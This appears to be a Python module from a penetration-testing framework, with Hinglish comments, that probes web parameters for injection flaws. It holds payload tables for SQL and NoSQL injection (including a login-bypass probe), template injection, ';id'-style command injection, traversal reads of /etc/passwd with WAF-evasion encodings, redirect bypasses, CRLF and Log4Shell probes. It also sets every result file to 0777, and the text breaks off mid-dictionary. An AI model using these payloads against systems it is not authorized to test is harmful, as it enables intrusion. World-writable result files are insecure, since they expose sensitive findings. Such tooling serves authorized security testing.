#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
WASP Module: mod_inject.py  |  Phase 12 - Injection (targeted, detection-only)
==============================================================================
v13.0.0 ULTRA ULTRA PRO MAX. Authorized security testing ONLY. Scope firewall +
rate limiter + request budget + evidence + checkpoint sab wasp_core se
inherit hote hain, isliye har request scope-check, rate-limit aur budget ke
andar hi jaati hai.

KYA KARTA HAI
  Phase 11 poochta tha: "authorized user kaun SA object touch kar sakta hai?"
  Phase 12 poochta hai: "user-controlled DATA ko SERVER CODE samajh raha hai?"
  -> injection = data ko code ke roop me interpret karne wali bug family.
  FUNDAMENTAL DISCIPLINE (runbook §10 handoff): blind fuzzer NAHI. Sirf wo
  params jo P1-P11 ke results me pehle se "reflect / behavior-diff / error"
  evidence leke aate hain - wahan targeted, hypothesis-driven probes.

STAGES (A-R)
  A  Injection surface discovery ... P8 priority queue + P5/P7 param inventories
                                     (params_all/interesting_params) + P6
                                     http_behavior + error_signatures + P9
                                     injection_oracle/auth_redirect_xss + P11
                                     feedforward + param-name heuristics ->
                                     evidence-ranked targets (capped)
  B  Baseline & calibration ........ per-endpoint 2x GET baseline (status/len/
                                     sha1/timing median+mad) + soft-404
                                     baseline (origin-shared) + WAF fingerprint
                                     (1 noisy probe per endpoint, capped)
  C  Error-based SQLi .............. quote-variant probes x 6-DB error
                                     fingerprint families (MySQL/Postgres/
                                     MSSQL/SQLite/Oracle + ORM/driver leaks)
  D  Boolean-based SQLi ............ paired probes (AND 1=1 vs 1=2; '1'='1 vs
                                     '1'='2): true~baseline AND false differs
                                     -> paired-diff verdict (soft-404 guard)
  E  Time-based SQLi ............... DB-native delays (SLEEP/pg_sleep/WAITFOR),
                                     timing z-score vs baseline, HARD cap,
                                     confirmed params skip (budget discipline)
  F  NoSQL injection ............... $ne/$gt/$regex operator injection (GET
                                     query + JSON search bodies, read-only);
                                     login-bypass probe GATED (default OFF);
                                     Mongo/BSON error fingerprints
  G  SSTI / EL detection ........... polyglot matrix {{7*7}} ${7*7} <%= %>
                                     #{ } *{ } + engine fingerprint (49 vs
                                     7777777) - SIRF arithmetic proof, RCE
                                     payload KABHI nahi (hard rule)
  H  Command injection (read-only) . ;id |id $(id) `id` %0aid fingerprints +
                                     blind timing (sleep, bounded) - sirf
                                     harmless id/sleep commands (hard rule)
  I  Path traversal (read-only) .... file/path/page params x 16 variants incl.
                                     WAF encodings (%2e%2e, %252e, %c0%af,
                                     ....//, ..\\..\\) x safe markers
                                     (root:x:0:0 / [fonts]) - sirf read, NO
                                     writes / NO /dev / NO big files
  J  Open redirect ................. redirect-param mining (P7 client_redirects
                                     + heuristics) x canary variants (//, /\,
                                     ///, userinfo, subdir-spoof) - canary =
                                     example.com (IANA reserved), redirect
                                     follow KABHI nahi (allow_redirects=False)
  K  CRLF / header injection ....... %0d%0aWASP-Probe: 1 response-header
                                     injection + Set-Cookie injection + literal
                                     reflection -> log-injection hypothesis
  L  HPP parameter pollution ....... dup-param (A,B vs B,A) precedence diff ->
                                     WAF-vs-backend desync hint (famous chain)
  M  WAF-aware payload shaping ..... jo params C/D me WAF-blocked hue, unko
                                     encode-variant re-probe (double-encode
                                     %2527, /**/ obfuscation, case shuffle,
                                     %09 tab, JSON \\u0027) -> "WAF ke neeche
                                     injection" HIGH finding
  N  GraphQL injection surface ..... P7/P11-mined ops par string-arg quote
                                     probes + did-you-mean error mining +
                                     numeric-arg type confusion - query-only
  O  Type confusion & deser hints .. p[]= / p[$ne] / json-in-string flips +
                                     JSON field type flips -> PHP/Java/Python/
                                     .NET deserialization error fingerprints
                                     (DETECTION ONLY - gadget payload KABHI)
  S  Header-based injection ........ X-Forwarded-For/Referer/UA header points par
                                     SQL-error + SSTI + CRLF fingerprints (log-
                                     injection sinks headers me bhi hote hain)
  T  Server-side prototype pollution __proto__[k]=v + constructor[prototype][k]=v
                                     bracket forms (GET query + JSON body) ->
                                     merged-key echo ya PP error fingerprint
  U  XXE canary (internal entity) .. XML endpoints par internal-entity DOCTYPE
                                     -> entity RESOLVED echo = parser entities
                                     process kar raha hai. External entity /
                                     file-read KABHI nahi (P15 manual, RoE).
  V  EL refine + Log4Shell (gated) . ${7*7} vs {{7*7}} control-pair se engine
                                     refine (java-el/spel); Log4Shell jndi probe
                                     LOOPBACK-ONLY (ldap://127.0.0.1:1) + DEFAULT
                                     OFF (inject_allow_log4shell) - koi external
                                     egress nahi. Obfuscated ${${lower:j}ndi..}
  W  CSV/formula injection ......... csv/export/report params par =formula
                                     probes -> unescaped CSV-cell reflection
                                     (stored-chain hypothesis P13/P20 ke liye)
  P  Reflection map (offline) ...... sab stage captures se: payload kahan
                                     reflect hua (HTML/attr/JS-string/header/
                                     JSON/encoded) -> XSS-ripe param table ->
                                     P13 handoff (0 extra requests)
  Q  Hypotheses & feedforward ...... ranked manual test plan + injection chains
                                     + to_phase13/14/17/20/21/23/32 handoff
  R  Reports ....................... findings.json, injection_matrix.json/txt,
                                     INJECTION_FINDINGS.md, injection_test_plan.md,
                                     injection_chains.txt + 26-file MANIFEST

ULTRA PRO MAX ADDITIONS (v12) - naye + famous injection techniques
  * Evidence-first targeting: har target ke paas P1-P11 ka pre-existing signal
    hota hai (reflection / behavior-diff / type-confusion / error-signature) -
    blind scanning budget kha jaata hai, ye framework budget bachata hai.
  * One-confirm-per-param rule: param ek stage me CONFIRMED hua to baaki stages
    usko skip karti hain (request budget bacho, dup findings nahi).
  * WAF fingerprint pehle, payload baad me: blocked vs vulnerable ka verdict
    alag hota hai - WAF_BLOCKED finding bug NAHI hai, stage M ka input hai.
  * Boolean verdict paired hai: true-payload ~ baseline AND false-payload
    differs - single-payload diff se false positives nahi aate.
  * Timing verdict baseline-relative hai (median+mad z-check) - network jitter
    pe false positive nahi.
  * SSTI engine matrix: 49 vs 7777777 vs engine-specific response context -
    engine identify karne tak, exploitation lab-only note ke saath.
  * Traversal WAF-encoding ladder: 16 variants me se JO bypass kare wahi
    record hota hai -> filtered finding (variant = proof detail).
  * Redirect canary discipline: example.com-family variants, allow_redirects
    hamesha False, koi external request framework se nahi jaata.
  * Deser fingerprints detection-only: error text se framework identify karo,
    gadget payload bhejna P20/manual ke liye hypothesis hai (RoE gate).

v12 FIXES (P9/P10/P11 ke lessons preemptively applied):
  FIX-1  probe-capture reuse: sab stages response captures share karte hain
         (ctx["captures"]) -> reflection map (stage P) ko 0 extra requests.
  FIX-2  WAF-block != SAFE: blocked responses alag verdict class (WAF_BLOCKED)
         me jaate hain aur stage M ka ranked input banate hain.
  FIX-3  soft-404 guard har diff-verdict par: catch-all template pe hua diff
         bug nahi hota (P11 blind-oracle lesson).
  FIX-4  findings checkpoint-replay par bhi derive hoti hain (resume par
         findings gayab nahi - P10 BUG-3 / P11 FIX-4 pattern).
  FIX-5  read-only intent POSTs (NoSQL search JSON / GraphQL) read_only_post=
         True ke saath + _ro_post/_gql_post compat shims (P11 FIX-5 pattern).
  FIX-6  redirect probes hamesha allow_redirects=False (koi canary follow
         nahi, koi external hop nahi).
  FIX-7  time-based/cmdi-timing probes budget me double-count hote hain aur
         hard-capped hain (expensive probes ka request-fairness).

v13 ULTRA ULTRA PRO MAX ADDITIONS (naye engines + packs + full detail)
  * Stage S header-injection: SQLi/CRLF sirf body params me nahi - log/auth
    sinks headers me; X-Forwarded-For quote-probe + echo detect (famous).
  * Stage T server-side prototype pollution: bracket syntax __proto__[x]=y
    GET + JSON body dono - merged-key echo = server merge confirm (famous,
    Node/Express-style sinks); PP error fingerprints fallback.
  * Stage U XXE canary: SIRF internal entity - resolved echo confirm karta
    hai parser entity-processing; external/file XXE P15 ka kaam (RoE gate).
  * Stage V EL engine-refine: {{7*7}} vs ${7*7} control-pair (dono 49 =
    mixed, sirf dollar = java-el/spel) + Log4Shell jndi loopback probes
    (DEFAULT OFF, RoE-gated, zero external egress - safe-by-default).
  * Stage W CSV formula injection: =cmd-style CELL payloads reflect hone par
    Excel/Sheets formula-execution chain ka hypothesis (stored vector).
  * Payload packs expanded: traversal +5 variants (Tomcat ..;/, double-slash,
    dot-slash, enc-backslash), redirect +4 bypass variants (escaped slashes,
    encoded scheme), CMDI +3 (abs-path, tab, trailing), SSTI +2 engines
    (Thymeleaf inline [[${..}]], Smarty {..}), WAF-shape +5 (fullwidth
    U+FF07, IIS %u0027, nested-double-encode, MySQL /*!50000 comment,
    backslash-quote), NoSQL $where probe, deser +2 fingerprints.
  * Full detail reporting: TECHNIQUES_CATALOG.md (har stage ka payload->
    signal->OWASP/CWE table) + cwe_owasp_map.json (machine-readable mapping)
    + feedforward ab P15/P16/P18 ko bhi ranked handoff deta hai.
  * Sab naye stages: checkpointed, budget-capped, capture-integrated
    (reflection map unhe bhi dekhta hai), RWX-guaranteed outputs.

VERDICT ENGINE (false-positive kam karne ke liye multi-signal)
  CONFIRMED   -> deterministic fingerprint (DB error / marker / 49 render /
                 uid= / Location-canary / injected header) baseline me NAHI tha
  SUSPECTED   -> single behavioral signal (diff / anomalous 200), soft-404
                 filtered - manual verify karo
  WAF_BLOCKED -> probes ko WAF ne block kiya (finding nahi, stage-M input)
  NOISE       -> baseline hi unstable tha (double-fetch diff) - verdict nahi
  SAFE        -> baseline-stable endpoint par koi signal nahi

SAFETY VALVES
  * allow_active=True zaroori hai probes ke liye (warna discovery + offline
    hypotheses only - 0 network probes).
  * DETECTION-ONLY hard rule: koi dump, koi data extraction, koi RCE payload,
    koi destructive command nahi. Probes sirf: quote/syntax errors, AND 1=1/1=2,
    bounded SLEEP(3), harmless `id`, {{7*7}} arithmetic, read-only passwd
    markers, canary redirects, marker headers.
  * Time-based + cmdi-timing OFF-by-cap + config-tunable (inject_time_probes,
    inject_cmdi_timing) - RoE me timing probes mana ho to 0 kar do.
  * NoSQL login-bypass probe default OFF (inject_nosql_login_probe) - ON karna
    sirf apne test accounts par (RoE).
  * GraphQL sirf query/read operations - mutation/subscription KABHI nahi.
  * Traversal sirf read-only known-safe markers (/etc/passwd, win.ini).
  * Har stage checkpointed (Ctrl+C safe), sab caps config se tunable.
  * Evidence/details me PII REDACT hota hai (email/phone/JWT masked).
  * Sab result files RWX (0777) - RWX standing rule wrappers se guaranteed.
"""

import os
import re
import sys
import json
import time
import math
import difflib
import urllib.parse

# --- WASP v2.2 standalone path fix (auto-inserted) ---
_wasp22_dir = os.path.dirname(os.path.abspath(__file__))
if _wasp22_dir not in sys.path:
    sys.path.insert(0, _wasp22_dir)
_wasp22_p = _wasp22_dir
while _wasp22_p != os.path.dirname(_wasp22_p):
    _wasp22_p = os.path.dirname(_wasp22_p)
    if os.path.exists(os.path.join(_wasp22_p, "wasp_core.py")):
        if _wasp22_p not in sys.path:
            sys.path.insert(0, _wasp22_p)
        break
# --- end WASP v2.2 fix ---

try:
    from wasp_core import (Cfg, Scope, ScopeError, Evidence, HttpClient, Checkpoint,
                           outdir_for, now_iso, save_json, save_text, load_json,
                           rand_str, shannon_entropy, host_of, median, truncate,
                           similarity, module_ctx, write_feedforward,
                           write_manifest, soft404_baseline, is_soft404, title_of,
                           info, ok, warn, err, head, C, VERSION)
    CORE = True
except ImportError:
    CORE = False
    print("[-] wasp_core.py isi folder me hona chahiye (wasp_core.py not found).")
    print("    Ye module WASP framework ka hissa hai: python3 wasp.py run --module 12")
    print("    Ya 'python3 mod_inject.py wizard' chalao targets config karne ke liye.")
    sys.exit(1)

NAME = "inject"
PHASE = "12-inject"
PLAN_VERSION = "13.0.0"

# ===========================================================================
# RWX STANDING RULE (user memory): pentest ke SAARE result/output files ko
# read+write+execute (0777 rwxrwxrwx) permission milni chahiye.
# Ye guard core ke save_json/save_text ke upar wrapper lagata hai - isliye
# IS module ka HAR result file (json/txt/md) + uska folder hamesha rwx hoga,
# ULTRA core ho ya ORIGINAL v2 core (graceful degrade par bhi).
# ===========================================================================
def _rwx_result(path):
    try:
        os.chmod(path, 0o777)
    except OSError:
        pass
    return path


def _rwx_save_json(path, obj):
    with open(path, "w") as f:
        json.dump(obj, f, indent=2, default=str)
    return _rwx_result(path)


def _rwx_save_text(path, text):
    with open(path, "w", errors="ignore") as f:
        f.write(text)
    return _rwx_result(path)


def _rwx_tree(root):
    if not os.path.isdir(root):
        return
    for _r, _d, _f in os.walk(root):
        for d in _d:
            _rwx_result(os.path.join(_r, d))
        for f in _f:
            _rwx_result(os.path.join(_r, f))


def _ro_post(cli, url, data=None, headers=None):
    """FIX-5: read-only intent POST (search/query JSON). ULTRA core par
    read_only_post=True read-gate se pass hota hai; PURANE v2 core par ye
    kwarg unsupported -> TypeError par bina kwarg fallback. v13: str data
    bytes me encode (urllib str body reject karta hai)."""
    if isinstance(data, str):
        data = data.encode()
    try:
        return cli.request("POST", url, data=data, headers=headers,
                           read_only_post=True, allow_redirects=False)
    except TypeError:
        return cli.request("POST", url, data=data, headers=headers,
                           allow_redirects=False)
    except ScopeError:
        return None


def _gql_post(cli, url, obj):
    body = json.dumps(obj)
    return _ro_post(cli, url, data=body.encode(),
                    headers={"Content-Type": "application/json"})


# ---------------------------------------------------------------------------
# TUNABLES (config.json se override; module ke apne defaults bhi hain)
# ---------------------------------------------------------------------------
DEFAULTS = {
    "inject_surface_cap": 24,          # max ranked targets probed per family
    "inject_param_cap": 40,            # max unique params considered
    "inject_error_probes": 24,         # stage C total quote probes
    "inject_boolean_probes": 16,       # stage D (8 pairs x 2 requests)
    "inject_time_probes": 6,           # stage E HARD cap (expensive)
    "inject_allow_time_based": True,   # stage E master gate
    "inject_timing_threshold": 2.5,    # seconds over baseline median -> hit
    "inject_allow_nosql": True,        # stage F master gate
    "inject_nosql_probes": 8,          # stage F total operator probes
    "inject_nosql_login_probe": False, # login-bypass $ne probe (RoE gated!)
    "inject_allow_ssti": True,         # stage G
    "inject_ssti_probes": 12,          # stage G total render probes
    "inject_allow_cmdi": True,         # stage H
    "inject_cmdi_probes": 8,           # stage H echo probes (id)
    "inject_cmdi_timing": False,       # stage H blind sleep probes (default OFF)
    "inject_allow_traversal": True,    # stage I
    "inject_traversal_probes": 16,     # stage I variant cap per target set
    "inject_allow_redirect": True,     # stage J
    "inject_redirect_probes": 12,      # stage J variant cap
    "inject_redirect_canary": "example.com",  # IANA-reserved doc domain
    "inject_allow_crlf": True,         # stage K
    "inject_crlf_probes": 6,           # stage K
    "inject_allow_hpp": True,          # stage L
    "inject_hpp_probes": 8,            # stage L
    "inject_waf_bypass": True,         # stage M (encode re-probe on blocked)
    "inject_waf_probes": 10,           # stage M cap
    "inject_allow_gql": True,          # stage N
    "inject_gql_probes": 6,            # stage N
    "inject_allow_deser": True,        # stage O
    "inject_deser_probes": 6,          # stage O
    "inject_reflection_map": True,     # stage P (0 extra requests)
    "inject_waf_probe_budget": 6,      # stage B WAF-fingerprint probe cap
    # --- v13 stages (S-W) ---
    "inject_allow_header_inject": True,  # stage S (header sinks)
    "inject_header_probes": 10,          # stage S header-point probes
    "inject_allow_proto": True,          # stage T (prototype pollution)
    "inject_proto_probes": 6,            # stage T (GET + JSON forms)
    "inject_allow_xxe": True,            # stage U (internal-entity canary)
    "inject_xxe_probes": 4,              # stage U (expensive POST bodies)
    "inject_allow_el": True,             # stage V part-1 (EL engine refine)
    "inject_el_probes": 6,               # stage V part-1 probe cap
    "inject_allow_log4shell": False,     # stage V part-2 (RoE gate! loopback-only)
    "inject_log4shell_probes": 4,        # stage V part-2 probe cap
    "inject_allow_csv": True,            # stage W (CSV formula)
    "inject_csv_probes": 5,              # stage W
}


# ===========================================================================
# KNOWLEDGE TABLES
# ===========================================================================
# Param-name families: naam se hypothesis (P8 PARAM_HYP se compatible).
SQLI_PARAM_HINTS = [
    "id", "sid", "uid", "pid", "cid", "rid", "aid", "mid", "oid", "nid", "tid",
    "q", "query", "search", "s", "keyword", "keywords", "k", "term", "find",
    "filter", "filters", "f", "sort", "order", "orderby", "order_by", "sort_by",
    "sortBy", "dir", "direction", "limit", "offset", "start", "page", "p",
    "category", "cat", "c", "type", "tag", "tags", "status", "state", "role",
    "email", "user", "username", "name", "title", "ref", "code", "num", "no",
    "value", "val", "field", "col", "column", "where", "having", "group_by",
]

SSTI_PARAM_HINTS = [
    "name", "template", "tpl", "view", "page", "render", "preview", "subject",
    "body", "message", "msg", "title", "content", "text", "html", "email_body",
    "display", "layout", "partial", "snippet", "greeting", "welcome", "label",
    "description", "summary", "format", "font", "signature", "bio", "nick",
    "nickname", "username", "firstname", "lastname", "full_name", "heading",
]

CMDI_PARAM_HINTS = [
    "host", "ip", "addr", "address", "domain", "url", "site", "server", "target",
    "cmd", "command", "exec", "run", "ping", "trace", "traceroute", "nslookup",
    "dig", "whois", "file", "filename", "path", "dir", "convert", "format",
    "resize", "compress", "export", "download", "package", "archive", "zip",
    "backup", "restore", "import", "upload_name", "source", "dest", "email_to",
]

FILE_PARAM_HINTS = [
    "file", "filename", "path", "page", "doc", "document", "download", "dl",
    "include", "inc", "template", "tpl", "view", "read", "readfile", "source",
    "style", "css", "js", "lang", "language", "locale", "theme", "skin", "img",
    "image", "pic", "photo", "attachment", "attach", "upload", "static", "asset",
    "resource", "res", "config", "conf", "log", "logfile", "backup", "old",
    "dir", "folder", "show", "load", "open", "cat", "fetch", "get", "media",
]

REDIRECT_PARAM_HINTS = [
    "next", "redirect", "redirect_url", "redirect_uri", "redirect_to",
    "return", "return_url", "returnTo", "return_to", "rurl", "r_uri", "rurl",
    "url", "u", "dest", "destination", "goto", "go", "continue", "cont",
    "target", "t", "link", "forward", "fwd", "out", "external", "exit",
    "callback", "cb", "callback_url", "view", "to", "path", "ref", "window",
    "logout_url", "login_url", "success_url", "error_url", "returnPath",
]

# SQL error fingerprint families: db -> [regex, ...]
# Order matters: pehle specific, phir generic. Case-insensitive compile.
SQL_ERROR_FAMILIES = [
    ("mysql", [
        r"you have an error in your sql syntax",
        r"warning:\s*mysql",
        r"unclosed quotation mark after the character string",  # (mssql bhi; mysql me bhi dikhta hai copies me)
        r"mysql_fetch", r"mysqli?", r"mysql_num_rows",
        r"com\.mysql\.jdbc", r"jdbc\.mysql",
        r"SQLSTATE\[42000\]", r"Pdo.*Mysql",
        r"MariaDB server version",
    ]),
    ("postgres", [
        r"pg_query\(\)", r"\[postgres\]", r"PostgreSQL.*ERROR",
        r"valid PostgreSQL result", r"Npgsql\.",
        r"pg_exec", r"PDO::pgsql", r"pg_last_error",
        r"ERROR:\s+syntax error at or near",
        r"relation \".*\" does not exist",
    ]),
    ("mssql", [
        r"microsoft sql server", r"\[SQL Server\]", r"ODBC SQL Server Driver",
        r"OLE DB.*SQL Server", r"(\W|\A)SQL Server.*Driver",
        r"Warning.*mssql_", r"Unclosed quotation mark after",
        r"SqlException", r"System\.Data\.SqlClient\.",
        r"Procedure or function .* expects parameter",
        r"Conversion failed when converting",
    ]),
    ("sqlite", [
        r"SQLite/JDBCDriver", r"SQLite\.Exception", r"System\.Data\.SQLite\.",
        r"SQLite error \d+", r"sqlite3\.", r"SQLITE_ERROR",
        r"unrecognized token:", r"near \".*\": syntax error",
        r"no such (table|column)", r"misuse of aggregate",
    ]),
    ("oracle", [
        r"\bORA-\d{5}", r"Oracle error", r"Oracle.*Driver", r"Warning.*oci_.*",
        r"quoted string not properly terminated",
    ]),
    ("generic_orm_driver", [
        r"java\.sql\.SQLException", r"org\.hibernate\.exception",
        r"org\.postgresql\.util\.PSQLException", r"com\.mysql\.cj\.exceptions",
        r"SQLSyntaxErrorException", r"DataTruncation",
        r"django\.db\.utils", r"ProgrammingError", r"OperationalError",
        r"SQLSTATE\[\w+\]", r"PDOException", r"Doctrine\\DBAL\\Exception",
        r"ActiveRecord::StatementInvalid", r"SequelizeDatabaseError",
        r"PrismaClientKnownRequestError", r"typeorm.*QueryFailedError",
        r"Unclosed quotation mark", r"syntax error at or near",
    ]),
]

# Global "a DB spoke here" signals (kisi bhi family ke saath check)
SQL_GLOBAL_SIGS = [
    r"\bSELECT\b.*\bFROM\b.*error", r"sql\s+syntax", r"sql error",
    r"bad sql grammar", r"query failed", r"database error",
]

NOSQL_ERROR_SIGS = [
    r"MongoServerError", r"BSONError", r"MongoError", r"BSONTypeError",
    r"Cast to \w+ failed for value", r"MongoDB\.\w+Error",
    r"cannot infer query fields.*both", r"\$ne.*operator", r"unknown operator",
    r"bad query.*BSON", r"nextObject.*error", r"SyntaxError.*mongo",
    r"Canos?n currently use.*(\$ne|\$regex|\$gt)", r"Unsupported conversion.*array",
    r"\$where.*had an invalid", r"invalid BSON", r"Not a Number",
]

NOSQL_GET_PAYLOADS = [
    ("$ne", lambda v: "x@x.test" if "mail" in v.lower() or "user" in v.lower() or "acct" in v.lower() else "x"),
    ("$ne", lambda v: ""),
    ("$gt", lambda v: ""),
    ("$regex", lambda v: ".*"),
    ("$where", lambda v: "1==1"),      # v13: trivial-truthy JS predicate (read-only)
]

NOSQL_JSON_PAYLOADS = [
    {"$ne": "x@x.test"},
    {"$ne": ""},
    {"$gt": ""},
    {"$regex": "^a"},
    {"$where": "1==1"},                # v13: read-only predicate
]

SSTI_PAYLOADS = [
    # (payload, engine_tag, expect_string)
    ("{{7*7}}", "jinja2/twig/nunjucks", "49"),
    ("${7*7}", "freemarker/velocity/el/thymeleaf", "49"),
    ("<%= 7*7 %>", "erb/ejs/underscore", "49"),
    ("#{7*7}", "ruby/thymeleaf-spring", "49"),
    ("*{7*7}", "thymeleaf-spring", "49"),
    ("{{7*'7'}}", "jinja2 (str-mul)", "7777777"),
    ("${\"{{\"}}7*7}}", "engine-confusion", "7*7"),
    ("[[${7*7}]]", "thymeleaf-inline", "49"),
    ("{7*7}", "smarty", "49"),
]

CMDI_PAYLOADS = [
    (";id", "id"),
    ("|id", "id"),
    ("$(id)", "id"),
    ("`id`", "id"),
    ("%0aid", "id"),
    ("&&id", "id"),
    ("; id #", "id"),
    (";/usr/bin/id", "id"),
    (";id;", "id"),
    ("%09id", "id"),
]

CMDI_FINGERPRINTS = [
    r"uid=\d+\([^)]*\)", r"gid=\d+\([^)]*\)", r"groups=\d+",
    r"uid=\d+", r"(\w+/\w+)?\s?gid=\d+",
]

TRAVERSAL_PAYLOADS = [
    ("../../../etc/passwd", "unix-basic"),
    ("../../../../../etc/passwd", "unix-deep"),
    ("..%2f..%2f..%2fetc%2fpasswd", "enc-slash"),
    ("%2e%2e%2f%2e%2e%2fetc%2fpasswd", "enc-dot"),
    ("%252e%252e%252fetc%252fpasswd", "double-enc"),
    ("..%c0%af..%c0%afetc%c0%afpasswd", "utf8-overlong"),
    ("....//....//etc/passwd", "dotdot-slash-strip"),
    ("..\\/..\\/etc\\/passwd", "backslash-mix"),
    ("/etc/passwd", "abs-unix"),
    ("php://filter/convert.base64-encode/resource=/etc/passwd", "php-filter"),
    ("file:///etc/passwd", "file-scheme"),
    ("..\\..\\..\\windows\\win.ini", "win-basic"),
    ("..\\..\\..\\windows\\win.ini%00", "win-nullbyte"),
    ("....\\\\....\\\\windows\\\\win.ini", "win-strip"),
    ("/windows/win.ini", "abs-win"),
    ("%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "utf8-overlong-dot"),
    ("..;/..;/etc/passwd", "tomcat-semicolon"),
    ("../..;/etc/passwd", "tomcat-mixed"),
    ("//etc/passwd", "double-slash-abs"),
    ("/etc/./passwd", "dot-slash-abs"),
    ("..%5c..%5c..%5cwindows%5cwin.ini", "enc-backslash-win"),
]

TRAVERSAL_MARKERS = [
    (r"root:[x*!]:0:0:", "unix-passwd"),
    (r"\[fonts\]", "win-ini"),
    (r"\[extensions\]", "win-ini"),
    (r"\[font files\]", "win-ini"),
    (r"daemon:/usr/sbin", "unix-passwd"),
]

REDIRECT_VARIANTS = [
    # (format, label) - canary hamesha example.com-family ya apna hi origin
    (lambda c, o: c, "plain-canary"),
    (lambda c, o: "//" + c, "protocol-relative"),
    (lambda c, o: "///" + c, "triple-slash"),
    (lambda c, o: "/\\" + c, "backslash-slash"),
    (lambda c, o: "https:/" + c, "single-slash-scheme"),
    (lambda c, o: "https:\\\\\\" + c, "scheme-backslashes"),
    (lambda c, o: "https://" + o.split("://", 1)[-1] + "." + c, "subdir-spoof"),
    (lambda c, o: "https://" + c + "@" + o.split("://", 1)[-1], "userinfo-spoof"),
    (lambda c, o: "https:" + c, "scheme-concat"),
    (lambda c, o: "/" + c, "path-canary"),
    (lambda c, o: "\\/\\/" + c, "escaped-protocol-relative"),
    (lambda c, o: "https:%2f%2f" + c, "enc-scheme-slashes"),
    (lambda c, o: "%2F%2F" + c, "enc-protocol-relative"),
    (lambda c, o: "https://" + c + "/%2f..", "trailing-enc-dots"),
]

CRLF_PAYLOADS = [
    ("%0d%0aWASP-Probe: wasp12", "crlf-header"),
    ("%0aWASP-Probe: wasp12", "lf-header"),
    ("%0d%0aSet-Cookie: wasp12=probe", "crlf-cookie"),
    ("%0d%0a%0d%0aWASP-probe-body", "crlf-body-split"),
]

DESER_FINGERPRINTS = [
    (r"unserialize\(", "php-unserialize"),
    (r"php object injection", "php-object-injection"),
    (r"java\.io\.StreamCorruptedException", "java-serialization"),
    (r"java\.lang\.ClassNotFoundException", "java-class-not-found"),
    (r"org\.yaml\.snakeyaml", "snakeyaml"),
    (r"pickle\.UnpicklingError", "python-pickle"),
    (r"InvalidDataException.*deserializ", "net-deserialize"),
    (r"Cannot deserialize", "generic-deserialize"),
    (r"kryo.*buffer underflow", "kryo"),
    (r"XMLDecode(r|d).*Exception", "xml-decoder"),
    (r"TypeMismatch", "type-mismatch"),
    (r"cannot deserialize.*value", "jackson-style"),
    (r"BadAttributeValueException", "deser-exception"),
    (r"O:\d+:\"[A-Za-z_\x7f-\xff]", "php-serialized-object"),
    (r"could not (find|determine) expected tag", "yaml-tag"),
]

WAF_BLOCK_SIGS = [
    (r"attention required.*cloudflare", "cloudflare"),
    (r"cloudflare.*ray id.*error 10\d\d", "cloudflare"),
    (r"access denied", "waf-generic"),
    (r"request blocked", "waf-generic"),
    (r"blocked by.*security", "waf-generic"),
    (r"mod_security", "modsecurity"),
    (r"ModSecurity", "modsecurity"),
    (r"web application firewall", "waf-generic"),
    (r"AWS WAF", "aws-waf"),
    (r"Request Blocked: [A-Za-z0-9.]+", "aws-waf"),
    (r"you don't have permission to access", "apache-deny"),
    (r"bot verification", "bot-check"),
    (r"captcha", "bot-check"),
    (r"406 not acceptable", "406-block"),
    (r"security reason", "waf-generic"),
    (r"wzws", "wzws"),
    (r"yundun", "aliyun-waf"),
    (r"safedog", "safedog"),
    (r"akamai.*reference", "akamai"),
]

WAF_STATUS_BLOCK = {403, 406, 418, 429, 451}

# WAF-shaping variants (stage M): (label, transform(payload))
WAF_SHAPE_VARIANTS = [
    ("double-url-encode", lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")),
    ("comment-obfuscation", lambda p: re.sub(r"(?i)\bAND\b", "/**/AND/**/", p)),
    ("case-shuffle", lambda p: re.sub(r"(?i)\bAND\b", "AnD", p)),
    ("tab-whitespace", lambda p: re.sub(r"(?i)(\bAND\b)", "%09\\1", p)),
    ("json-unicode", lambda p: p.replace("'", "\\u0027")),
    ("newline-whitespace", lambda p: re.sub(r"(?i)(\bAND\b)", "%0a\\1", p)),
    ("fullwidth-quote", lambda p: p.replace("'", "%EF%BC%87")),
    ("iis-unicode-escape", lambda p: p.replace("'", "%u0027")),
    ("nested-double-encode", lambda p: p.replace("'", "%252527")),
    ("mysql-version-comment", lambda p: p.replace(" AND ", ")/*!50000AND*/ ", 1)),
    ("backslash-quote-enc", lambda p: p.replace("'", "%5C%27")),
]

# ---------------------------------------------------------------------------
# SEVERITY HINTS (key -> (severity, cvss_hint, why_it_matters))
# ---------------------------------------------------------------------------
SEVERITY_HINTS = {
    "sqli_error": ("critical", 9.8,
                   "Database error text externally trigger ho raha hai - DB stack/schema leak + "
                   "confirmed injection sink. Detection-proof ke baad dump RoE-gated hai."),
    "sqli_boolean": ("critical", 9.8,
                   "Boolean-based SQL injection confirmed - attacker data ko true/false oracle "
                   "bana sakta hai (blind extraction manual/RoE-gated)."),
    "sqli_time": ("critical", 9.1,
                   "Time-based SQL injection - DB query me attacker-controlled delay; blind "
                   "extraction possible (slow, RoE-gated)."),
    "sqli_waf_bypassable": ("high", 8.6,
                           "WAF inject payloads block karta hai par encoding variants ke neeche "
                           "same signal pass hota hai - defense-in-depth weak, underlying sink live."),
    "sql_error_disclosure": ("medium", 5.3,
                             "Error text me DB/driver/version details leak - recon value + "
                             "confidence boost for injection class."),
    "nosql_injection": ("critical", 9.1,
                        "NoSQL operator injection ($ne/$regex/$gt) accepted - auth/search logic "
                        "operator-expandable, data exposure ya auth bypass (test-accounts only)."),
    "nosql_login_bypass": ("critical", 9.8,
                           "Login endpoint par $ne operator accept hua - credential-less auth "
                           "bypass (sirf APNE test accounts par demo karo)."),
    "ssti_detected": ("critical", 9.8,
                      "Server-side template injection confirmed (arithmetic render) - engine "
                      "ke hisaab se RCE tak jata hai. Exploitation SIRF lab/RoE me."),
    "ssti_possible": ("high", 8.2,
                      "Template syntax reflect hota hai par arithmetic render confirm nahi - "
                      "manual context check karo (engine-blind polyglot follow-up)."),
    "cmdi_detected": ("critical", 9.8,
                      "Command output (uid=/gid=) response me aa gaya - OS command injection. "
                      "RCE ke aage ke steps RoE-gated."),
    "cmdi_blind_time": ("critical", 9.1,
                        "Blind command injection (timing oracle) - output nahi dikhta par command "
                        "execute hota hai."),
    "path_traversal_confirmed": ("critical", 9.1,
                                 "Arbitrary file read confirmed (safe marker file) - creds/config/"
                                 "source leak chain. SIRF read-only markers use kiye gaye."),
    "path_traversal_hint": ("high", 7.5,
                            "File-param anomalous behavior (traversal-variant par non-standard "
                            "response) - manual confirmation pending."),
    "traversal_waf_bypass": ("high", 8.6,
